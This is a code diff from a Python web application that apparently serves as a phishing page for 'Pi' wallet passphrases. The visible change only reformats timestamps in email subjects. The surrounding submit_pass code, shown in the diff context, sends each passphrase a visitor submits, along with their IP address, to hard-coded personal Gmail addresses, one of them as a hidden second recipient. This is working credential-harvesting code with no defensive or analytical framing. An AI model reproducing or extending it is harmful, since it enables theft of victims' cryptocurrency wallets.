@@ -8,7 +8,7 @@ from datetime import datetime
 import requests
 import socket
 import uuid
-current_date = datetime.now().date()
+current_date = datetime.now()
 current_time = datetime.now()
 formatted_time = current_time.strftime("%Y-%m-%d %H:%M:%S")
 
@@ -43,6 +43,7 @@ def get_ip_address():
 
 
 def index(request, redi=None):
+
     if redi != None:
         if redi == "Pass":
             keys = request.session.get('look_up', None)
@@ -130,16 +131,16 @@ def submit_pass(request):
                     ip_address = ip_address
 
                 if my_site:
-                    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {current_date} (My site)', email_to="ezekielobiajulu0@gmail.com")
+                    send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time} (My site)', email_to="ezekielobiajulu0@gmail.com")
 
                 else:
                     if testing:
-                        send_notify(payload=f'Testing submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {current_date}', email_to="ezekielobiajulu0@gmail.com")
+                        send_notify(payload=f'Testing submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="ezekielobiajulu0@gmail.com")
 
                     else:
-                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {current_date}', email_to="ezekielobiajulu0@gmail.com")
+                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the ip address is (- {ip_address}) - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="ezekielobiajulu0@gmail.com")
                     
-                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {current_date}', email_to="obikeechiemerielinus@gmail.com")
+                        send_notify(payload=f'Pass Phrase submitted - {formatted_time} - the passphrase is -( {keys} )', subject=f'Pi site Token Submitted {formatted_time}', email_to="obikeechiemerielinus@gmail.com")
 
                 if my_site:
                     request.session['look_up'] = look_up_key
